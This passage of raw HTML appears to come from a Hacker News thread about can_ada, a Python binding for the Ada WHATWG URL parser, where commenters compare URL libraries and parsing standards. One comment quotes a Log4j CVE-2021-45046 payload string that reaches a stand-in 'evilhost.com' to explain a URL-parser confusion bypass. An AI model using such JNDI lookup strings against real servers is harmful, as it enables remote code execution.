but it was killed in Werkzeug 3.</div><br/><div id="39728680" class="c"><input type="checkbox" id="c-39728680" checked=""/><div class="controls bullet"><span class="by">pyuser583</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728635">parent</a><span>|</span><a href="#39729329">next</a><span>|</span><label class="collapse" for="c-39728680">[-]</label><label class="expand" for="c-39728680">[2 more]</label></div><br/><div class="children"><div class="content">I remember and miss that. But I’m not going to install werkzeug just for the url parsing.</div><br/><div id="39729900" class="c"><input type="checkbox" id="c-39729900" checked=""/><div class="controls bullet"><span class="by">d_kahneman7</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728680">parent</a><span>|</span><a href="#39729329">next</a><span>|</span><label class="collapse" for="c-39729900">[-]</label><label class="expand" for="c-39729900">[1 more]</label></div><br/><div class="children"><div class="content">Is it that inconvenient?</div><br/></div></div></div></div></div></div><div id="39729329" class="c"><input type="checkbox" id="c-39729329" checked=""/><div class="controls bullet"><span class="by">joouha</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728540">parent</a><span>|</span><a href="#39728635">prev</a><span>|</span><a href="#39728830">next</a><span>|</span><label class="collapse" for="c-39729329">[-]</label><label class="expand" for="c-39729329">[1 more]</label></div><br/><div class="children"><div class="content">You might be interested in <a href="https:&#x2F;&#x2F;github.com&#x2F;fsspec&#x2F;universal_pathlib">https:&#x2F;&#x2F;github.com&#x2F;fsspec&#x2F;universal_pathlib</a></div><br/></div></div></div></div></div></div><div id="39729570" class="c"><input type="checkbox" id="c-39729570" checked=""/><div class="controls bullet"><span class="by">bormaj</span><span>|</span><a href="#39728448">prev</a><span>|</span><a href="#39729869">next</a><span>|</span><label class="collapse" for="c-39729570">[-]</label><label class="expand" for="c-39729570">[5 more]</label></div><br/><div class="children"><div class="content">Why not just use `httpx`? If you&#x27;re not bound to the stdlib, it&#x27;s a great alternative to `requests` and url parse</div><br/><div id="39730072" class="c"><input type="checkbox" id="c-39730072" checked=""/><div class="controls bullet"><span class="by">kmike84</span><span>|</span><a href="#39729570">parent</a><span>|</span><a href="#39730129">next</a><span>|</span><label class="collapse" for="c-39730072">[-]</label><label class="expand" for="c-39730072">[1 more]</label></div><br/><div class="children"><div class="content">The URL parsing in httpx is rfc3986, which is not the same as WHATWG URL living standard.<p>rfc3986 may reject URLs which browsers accept, or it can handle them in a different way. WHATWG URL living standard tries to put on paper the real browser behavior, so it&#x27;s a much better standard if you need to parse URLs extracted from real-world web pages.</div><br/></div></div><div id="39730129" class="c"><input type="checkbox" id="c-39730129" checked=""/><div class="controls bullet"><span class="by">gjvc</span><span>|</span><a href="#39729570">parent</a><span>|</span><a href="#39730072">prev</a><span>|</span><a href="#39729704">next</a><span>|</span><label class="collapse" for="c-39730129">[-]</label><label class="expand" for="c-39730129">[2 more]</label></div><br/><div class="children"><div class="content">httpx is great, and &quot;needs to be in base&quot;</div><br/><div id="39730337" class="c"><input type="checkbox" id="c-39730337" checked=""/><div class="controls bullet"><span class="by">orf</span><span>|</span><a href="#39729570">root</a><span>|</span><a href="#39730129">parent</a><span>|</span><a href="#39729704">next</a><span>|</span><label class="collapse" for="c-39730337">[-]</label><label class="expand" for="c-39730337">[1 more]</label></div><br/><div class="children"><div class="content">No it doesn’t, absolutely not. It’s ironic that you say this after the post you’re commenting on spells out quite explicitly why things “in base” are hard to change and adapt.</div><br/></div></div></div></div></div></div><div id="39729869" class="c"><input type="checkbox" id="c-39729869" checked=""/><div class="controls bullet"><span class="by">ojbyrne</span><span>|</span><a href="#39729570">prev</a><span>|</span><a href="#39728643">next</a><span>|</span><label class="collapse" for="c-39729869">[-]</label><label class="expand" for="c-39729869">[3 more]</label></div><br/><div class="children"><div class="content">Looking at the github site for can_ada, I discovered that the developers live in Montreal, Canada. Nice one.</div><br/><div id="39730074" class="c"><input type="checkbox" id="c-39730074" checked=""/><div class="controls bullet"><span class="by">TkTech</span><span>|</span><a href="#39729869">parent</a><span>|</span><a href="#39729929">next</a><span>|</span><label class="collapse" for="c-39730074">[-]</label><label class="expand" for="c-39730074">[1 more]</label></div><br/><div class="children"><div class="content">I do! :) I should probably also never be allowed to name things.</div><br/></div></div></div></div><div id="39728643" class="c"><input type="checkbox" id="c-39728643" checked=""/><div class="controls bullet"><span class="by">ulrischa</span><span>|</span><a href="#39729869">prev</a><span>|</span><a href="#39729882">next</a><span>|</span><label class="collapse" for="c-39728643">[-]</label><label class="expand" for="c-39728643">[5 more]</label></div><br/><div class="children"><div class="content">Parsing an url is really a pain in the a*</div><br/><div id="39728944" class="c"><input type="checkbox" id="c-39728944" checked=""/><div class="controls bullet"><span class="by">SloopJon</span><span>|</span><a href="#39728643">parent</a><span>|</span><a href="#39728846">next</a><span>|</span><label class="collapse" for="c-39728944">[-]</label><label class="expand" for="c-39728944">[3 more]</label></div><br/><div class="children"><div class="content">Another post in this thread was downvoted and flagged (really?) for claiming that URL parsing isn&#x27;t difficult.  The linked article claims that &quot;Parsing URLs <i>correctly</i> is surprisingly hard.&quot;  As a software tester, I&#x27;m very willing to believe that, but I don&#x27;t know that the article really made the case.<p>I did find a paper describing some vulnerabilities in popular URL parsing libraries, including urllib and urllib3.  Blog post here:<p><a href="https:&#x2F;&#x2F;claroty.com&#x2F;team82&#x2F;research&#x2F;exploiting-url-parsing-confusion" rel="nofollow">https:&#x2F;&#x2F;claroty.com&#x2F;team82&#x2F;research&#x2F;exploiting-url-parsing-c...</a><p>Paper here:<p><a href="https:&#x2F;&#x2F;web-assets.claroty.com&#x2F;exploiting-url-parsing-confusion.pdf" rel="nofollow">https:&#x2F;&#x2F;web-assets.claroty.com&#x2F;exploiting-url-parsing-confus...</a><p>If you remember the Log4j vulnerability from a couple of years ago, that was an URL parsing bug.</div><br/><div id="39729284" class="c"><input type="checkbox" id="c-39729284" checked=""/><div class="controls bullet"><span class="by">masklinn</span><span>|</span><a href="#39728643">root</a><span>|</span><a href="#39728944">parent</a><span>|</span><a href="#39728846">next</a><span>|</span><label class="collapse" for="c-39729284">[-]</label><label class="expand" for="c-39729284">[2 more]</label></div><br/><div class="children"><div class="content">&gt; If you remember the Log4j vulnerability from a couple of years ago, that was an URL parsing bug.<p>I don&#x27;t think that&#x27;s a fair description of the issue.<p>The log4j vulnerability was that it specifically added JNDI support (<a href="https:&#x2F;&#x2F;issues.apache.org&#x2F;jira&#x2F;browse&#x2F;LOG4J2-313" rel="nofollow">https:&#x2F;&#x2F;issues.apache.org&#x2F;jira&#x2F;browse&#x2F;LOG4J2-313</a>) to property substitution (<a href="https:&#x2F;&#x2F;logging.apache.org&#x2F;log4j&#x2F;2.x&#x2F;manual&#x2F;configuration.html#PropertySubstitution" rel="nofollow">https:&#x2F;&#x2F;logging.apache.org&#x2F;log4j&#x2F;2.x&#x2F;manual&#x2F;configuration.ht...</a>), which it would apply on logged messages. So it was a pretty literal feature of log4j. log4j would just pass the URL to JNDI for resolution, and substitute the result.</div><br/><div id="39729339" class="c"><input type="checkbox" id="c-39729339" checked=""/><div class="controls bullet"><span class="by">SloopJon</span><span>|</span><a href="#39728643">root</a><span>|</span><a href="#39729284">parent</a><span>|</span><a href="#39728846">next</a><span>|</span><label class="collapse" for="c-39729339">[-]</label><label class="expand" for="c-39729339">[1 more]</label></div><br/><div class="children"><div class="content">I didn&#x27;t look into this in detail at the time, but the report&#x27;s summary of CVE-2021-45046 is that the parser that validated an URL behaved differently than a separate parser used to fetch the URL, so an URL like<p><pre><code>    jndi:ldap:&#x2F;&#x2F;127.0.0.1#.evilhost.com:1389&#x2F;a
</code></pre>
is validated as 127.0.0.1, which may be whitelisted, but fetched from evilhost.com, which probably isn&#x27;t.</div><br/></div></div></div></div></div></div></div></div><div id="39728721" class="c"><input type="checkbox" id="c-39728721" checked=""/><div class="controls bullet"><span class="by">bqmjjx0kac</span><span>|</span><a href="#39728372">prev</a><span>|</span><a href="#39731123">next</a><span>|</span><label class="collapse" for="c-39728721">[-]</label><label class="expand" for="c-39728721">[3 more]</label></div><br/><div class="children"><div class="content">Writing a new parser in C++ is a mistake IMO. At the very least, you need to write a fuzzer. At best, you should be using one of the many memory safe languages available to you.<p>I retract my criticism if this project is just for fun.<p>Edit: downvoters, do you disagree?<p>Edit2: OK, I may have judged a bit prematurely. <i>Ada</i> itself has fuzzers and tests. They&#x27;re just not exported to the <i>can_ada</i> project.</div><br/><div id="39731314" class="c"><input type="checkbox" id="c-39731314" checked=""/><div class="controls bullet"><span class="by">yagiznizipli</span><span>|</span><a href="#39728721">parent</a><span>|</span><a href="#39731123">next</a><span>|</span><label class="collapse" for="c-39731314">[-]</label><label class="expand" for="c-39731314">[2 more]</label></div><br/><div class="children"><div class="content">Ada developer here. Ada has more than 5000 tests, is included in oss-fuzz project and battle tested in Node.js and Cloudflare workers.</div><br/><div id="39731773" class="c"><input type="checkbox" id="c-39731773" checked=""/><div class="controls bullet"><span class="by">bqmjjx0kac</span><span>|</span><a href="#39728721">root</a><span>|</span><a href="#39731314">parent</a><span>|</span><a href="#39731123">next</a><span>|</span><label class="collapse" for="c-39731773">[-]</label><label class="expand" for="c-39731773">[1 more]</label></div><br/><div class="children"><div class="content">I apologize for the misjudgment. I just followed the link to can_ada and saw really minimal tests, e.g. <a href="https:&#x2F;&#x2F;github.com&#x2F;TkTech&#x2F;can_ada&#x2F;blob&#x2F;main&#x2F;tests&#x2F;test_parsing.py">https:&#x2F;&#x2F;github.com&#x2F;TkTech&#x2F;can_ada&#x2F;blob&#x2F;main&#x2F;tests&#x2F;test_parsi...</a><p>I didn&#x27;t understand that can_ada is not where the parser is developed.</div><br/></div></div></div></div></div></div><div id="39731123" class="c"><input type="checkbox" id="c-39731123" checked=""/><div class="controls bullet"><span class="by">nerdponx</span><span>|</span><a href="#39728721">prev</a><span>|</span><label class="collapse" for="c-39731123">[-]</label><label class="expand" for="c-39731123">[2 more]</label></div><br/><div class="children"><div class="content">No mention of prior art? The Hyperlink library has stated correctness as its goal for a long time: <a href="https:&#x2F;&#x2F;pypi.org&#x2F;project&#x2F;hyperlink" rel="nofollow">https:&#x2F;&#x2F;pypi.org&#x2F;project&#x2F;hyperlink</a><p>Of course there is always room for new projects, but it still feels weird to act as if this is the first time anybody has ever tried this. It seems like a lot of people are under this same mistaken impression, at least according to the sample of HN users who commented in this thread.</div><br/><div id="39731812" class="c"><input type="checkbox" id="c-39731812" checked=""/><div class="controls bullet"><span class="by">TkTech</span><span>|</span><a href="#39731123">parent</a><span>|</span><label class="collapse" for="c-39731812">[-]</label><label class="expand" for="c-39731812">[1 more]</label></div><br/><div class="children"><div class="content">Hyperlink (which I didn&#x27;t know existed, by the way) is not a parser for the WHATWG spec, it&#x27;s for RFC3986. You seem to be getting things confused.</div><br/></div></div></div></div></div></div></div></div></div></body></html>